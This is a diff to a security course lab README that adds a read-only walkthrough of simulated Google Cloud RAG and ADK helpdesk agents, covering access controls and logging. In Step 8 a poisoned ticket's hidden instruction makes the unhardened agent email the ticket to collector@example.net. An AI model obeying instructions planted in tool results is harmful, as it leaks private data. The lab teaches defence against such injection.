@@ -56,6 +56,7 @@ Stay in the `ai-security-course-labs` folder: the first step below takes you int
 | `controls.py` | The agent's `before_tool` callback. **You edit it in Step 7** |
 | `checker.py` | Rules `GC13-01` to `GC13-17` over a twin, plus `GC13-18` for you to write |
 | `attack.py` | Five attacks and two legitimate requests (R1 to R7); `--logs` prints the tool-call log |
+| `explore.py` | Step 1b: shows each piece on its own (`source`, `corpus`, `retrieve`, `reach`, `search`, `acl`, `agent`, `turn`). Read-only: it reads the lab's files and asks the twins; nothing is sent anywhere |
 | `twin/today/`, `twin/hardened/` | `deployment.json`: retrieval, buckets, perimeter, the agent's identity, tools, plugins, logging |
 | `twin/requirements.json` | ExampleCo's rules (CMEK, EU, internal domain, which groups count as "everyone") |
 | `data/` | Fake documents (one poisoned), fake tickets (one poisoned), and the identity twin's users and groups |
@@ -103,6 +104,249 @@ key or host creeps in.
 - Optional, guided build: Terraform 1.5+, the `gcloud` CLI and **your own** sandbox project with billing and a budget
   (lesson 0.7 and GC10). The GC11 or GC12 project is fine.
 
+## Step 1b · Before you check: look at each piece (about 10 minutes)
+
+New to RAG Engine, Agent Search and ADK? Do this before Step 1 (lesson 13.3 calls it "Before you start", and lesson
+13.0 walks through the same twelve ideas). `explore.py` shows each piece one at a time. Real output below is from a
+fresh Ubuntu machine (recording run 41615711324).
+
+**What it really runs.** Nothing that changes anything: `explore.py` reads `data/` and `twin/` and asks the same
+stand-ins as the rest of the lab (`gcp_twin.py`, `adk_twin.py`, `helpdesk_agent.py`). No network, no Google Cloud
+account.
+
+**0. Look before you run.** Go to the lab folder, then ask `make` what `make setup` would run, without running it:
+
+```bash
+cd labs/gc13
+make -n setup
+make setup
+```
+
+```text
+python3 ../../tools/check_python.py 3.11
+Nothing to install for this lab: Python 3.12 and its standard library are all it needs.
+```
+
+Other labs make a *virtual environment* here (a private folder for that lab's Python packages, so versions don't
+clash; it keeps versions apart, it isn't a security sandbox) and run `pip install`. The main lab uses only Python's
+standard library; only the optional Step 6 needs a virtual environment.
+
+**1. The data source.** The buckets the import reads, and who may add files to each:
+
+```bash
+python3 explore.py source
+```
+
+```text
+The documents, and the Cloud Storage buckets the import job reads them from:
+
+  gs://example-kb-curated   who may add files: group:kb-editors@example.com
+    vpn-setup.md                   team all      "VPN setup"
+    refund-policy.md               team all      "Refund policy"
+    office-hours.md                team all      "Office hours"
+    finance/pricing-2027.md        team finance  "Finance: 2027 hospital partner pricing (CONFIDENTIAL)"
+  gs://example-kb-inbox   who may add files: group:all-engineers@example.com
+    refund-policy-update.md        team all      "Refund policy update"
+                                   + one HTML comment with a labelled lab placeholder: hidden on a web page,
+                                     plain text to a program
+
+team = a metadata tag on each file. Anyone who may add files to a bucket the import reads can put words
+in front of the model.
+```
+
+**2. RAG Engine corpora.** Today's port puts every file in one corpus; the hardened one has a corpus per audience:
+
+```bash
+python3 explore.py corpus today
+python3 explore.py corpus hardened
+```
+
+```text
+RAG Engine in project example-chatbot-prod, region europe-west4 (twin today)
+  RagManagedDb tier   basic   (the managed database that holds every corpus here)
+  imports from        gs://example-kb-curated, gs://example-kb-inbox
+
+An import reads each file, splits it into chunks (default 1,024 tokens, 256 overlapping), embeds each
+chunk and stores it in a corpus (RAG Engine's name for an index):
+
+  corpus helpdesk-kb  no audience set                            no CMEK
+    kb-vpn               team all      ~45 tokens -> 1 chunk
+    kb-refund            team all      ~41 tokens -> 1 chunk
+    kb-hours             team all      ~18 tokens -> 1 chunk
+    fin-pricing          team finance  ~34 tokens -> 1 chunk
+    inbox-refund-update  team all      ~50 tokens -> 1 chunk
+
+Which documents a request may reach: the MODEL's "team" argument becomes a metadata filter.
+A corpus has no per-document ACL. The twin keeps words, not vectors: its scores are word overlap.
+```
+
+`corpus hardened` shows `kb-staff` (for `helpdesk-staff@example.com`) and `kb-finance` (for
+`finance-team@example.com`), both with `CMEK helpdesk-data`, and only the curated bucket as a source.
+
+**3. One retrieveContexts call, with a metadata filter.** Whoever writes the filter decides what is searched:
+
+```bash
+python3 explore.py retrieve today "What discount do hospital partners get?" --filter 'team == "finance"'
+```
+
+```text
+POST /v1/projects/example-chatbot-prod/locations/europe-west4:retrieveContexts
+  caller   service-100000000001@gcp-sa-aiplatform-re.iam.gserviceaccount.com   (the agent's identity)
+  vertex_rag_store       {"rag_resources": [{"rag_corpus": "helpdesk-kb"}]}
+  query.text             "What discount do hospital partners get?"
+  rag_retrieval_config   {"top_k": 2, "filter": {"metadata_filter": "team == \"finance\""}}
+  (no field names the person who asked)
+
+The response: 1 context
+  score 0.30  gs://example-kb-curated/finance/pricing-2027.md
+              "Finance pricing 2027 (CONFIDENTIAL). In 2027, hospital partners get a discount of 18% off ..."
+
+A metadata filter only narrows what is searched. It doesn't check who is asking.
+```
+
+**4. What the agent's identity can reach.** RAG Engine checks permission on the project, so the corpus choice lives
+in your tool code:
+
+```bash
+python3 explore.py reach hardened
+```
+
+```text
+The agent runs as helpdesk-agent@example-chatbot-prod.iam.gserviceaccount.com
+Its roles on project example-chatbot-prod: roles/aiplatform.user
+
+Could that identity call retrieveContexts on each corpus? (RAG Engine checks permission on the project)
+  kb-staff     YES
+  kb-finance   YES
+
+Which corpora the tool searches for each person:
+  alice@example.com  kb-staff               (from the verified groups)
+  bob@example.com    kb-staff, kb-finance   (from the verified groups)
+```
+
+**5. Agent Search with document ACLs.** The results depend on whose credentials the search carries:
+
+```bash
+python3 explore.py search hardened "hospital partner discount" --as alice@example.com
+python3 explore.py search hardened "hospital partner discount"
+```
+
+```text
+Agent Search data store helpdesk-docs (twin hardened), location eu
+  access control   ON (acl_enabled, chosen when the store was created)
+  the search runs with the credentials of: helpdesk-agent@example-chatbot-prod.iam.gserviceaccount.com
+
+POST /v1/.../dataStores/helpdesk-docs/servingConfigs/default_search:search   query "hospital partner discount"
+
+The response: 0 results
+
+The agent's own account is on no document's reader list, so it gets nothing. Adding it to every group
+would "fix" that and give everyone everything again.
+```
+
+As `alice@example.com` the same search also returns `0 results`; as `bob@example.com` (finance team) it returns
+`fin-pricing`.
+
+**6. One ACL decision.**
+
+```bash
+python3 explore.py acl alice@example.com fin-pricing
+```
+
+```text
+Would alice@example.com get fin-pricing ("Finance: 2027 hospital partner pricing ...")
+from an Agent Search data store with access control?
+
+  1. the readers on the document   group_id finance-team@example.com
+  2. alice's groups                helpdesk-staff@example.com   (from the identity provider)
+  3. on the reader list?           no
+
+  -> left out of the results, if the search carries alice@example.com's identity.
+     Searched with the agent's own account, the caller is the agent, and the agent is on no list.
+```
+
+**7. The ADK agent.** Its identity, roles, tools, callback, Model Armor plugin and log fields:
+
+```bash
+python3 explore.py agent today
+```
+
+```text
+The Helpdesk agent (twin today): ADK 2.12.0 on Agent Runtime
+
+  runs as        service-100000000001@gcp-sa-aiplatform-re.iam.gserviceaccount.com
+                 (the default: the project's Reasoning Engine Service Agent, shared by every agent here)
+  project roles  roles/aiplatform.user, roles/bigquery.dataEditor, roles/storage.admin
+  the end user   user_id in the request body (any caller can write it)
+  sessions       VertexAiSessionService
+
+  Tools (FunctionTool):
+    search_kb     read  runs at once
+    get_ticket    read  runs at once
+    send_email    WRITE runs at once
+    close_ticket  WRITE runs at once
+
+  before_tool_callback  none
+  ModelArmorPlugin
+    prompt_template_name       helpdesk-guard
+    response_template_name     helpdesk-guard
+    tool_output_template_name  not set: not screened
+    block_on_screening_failure true
+
+  tool-call log fields  agent_principal, tool, args, decision
+  message content in trace spans: true; trace readers group:all-engineers@example.com
+```
+
+`agent hardened` shows the fixed port: a dedicated service account with `roles/aiplatform.user` only, the end user
+from a verified ID token, both writes waiting for a person, `controls.before_tool`, tool output screened (with
+`block_on_screening_failure false`, the gap Step 5 exploits) and `end_user` in the log.
+
+**8. One turn, in ADK order.** Read it from the top:
+
+```bash
+python3 explore.py turn today alice@example.com "Summarise ticket T-2042 for me."
+```
+
+```text
+One turn on ADK 2.12.0 (twin today). Shapes follow ADK's; nothing is sent.
+
+  1. who        alice@example.com, from user_id in the request body
+                the server writes end_user and groups into session state
+  2. tool       get_ticket({"ticket_id": "T-2042"}) EXECUTED
+                the result carries a hidden instruction for the model
+  3. tool       send_email({"to": "collector@example.net", "ticket_id": "T-2042"}) EXECUTED
+  4. answer     "Done: sent."
+
+  tool-call log, 2 lines (service account domains .iam.gserviceaccount.com left off):
+    agent_principal=service-100000000001@gcp-sa-aiplatform-re  tool=get_ticket  decision=EXECUTED
+    agent_principal=service-100000000001@gcp-sa-aiplatform-re  tool=send_email  decision=EXECUTED
+
+  outbox: collector@example.net
+```
+
+On `hardened` a write pauses for a person and the log names the end user:
+
+```bash
+python3 explore.py turn hardened bob@example.com "Please close ticket T-2041, the customer confirmed it is fixed."
+```
+
+```text
+One turn on ADK 2.12.0 (twin hardened). Shapes follow ADK's; nothing is sent.
+
+  1. who        bob@example.com, from the verified ID token
+                the server writes end_user and groups into session state
+  2. pause      close_ticket({"ticket_id": "T-2041"}) -> adk_request_confirmation via approval queue
+                originalFunctionCall shows the arguments; the person answers: approve
+  3. approved   close_ticket: before_tool callbacks run again, then the tool
+  4. tool       close_ticket({"ticket_id": "T-2041"}) EXECUTED
+  5. answer     "Done: closed."
+
+  tool-call log, 3 lines (service account domains .iam.gserviceaccount.com left off):
+    agent_principal=helpdesk-agent@example-chatbot-prod  end_user=bob@example.com  tool=close_ticket  decision=PAUSED for a person (approval queue)
+    agent_principal=helpdesk-agent@example-chatbot-prod  end_user=bob@example.com  tool=close_ticket  decision=APPROVED by a person
+    agent_principal=helpdesk-agent@example-chatbot-prod  end_user=bob@example.com  tool=close_ticket  decision=EXECUTED
+```
+
 ## Step 1 · Check: what did the port lose?
 
 ```bash
@@ -110,7 +354,7 @@ cd labs/gc13
 make check
 ```
 
-- `cd labs/gc13`: or wherever you put this folder
+- `cd labs/gc13`: or wherever you put this folder; skip it if Step 1b already took you there
 - `make check`: same as `python3 checker.py --twin today`
 
 Real output (Linux, Python 3.13):
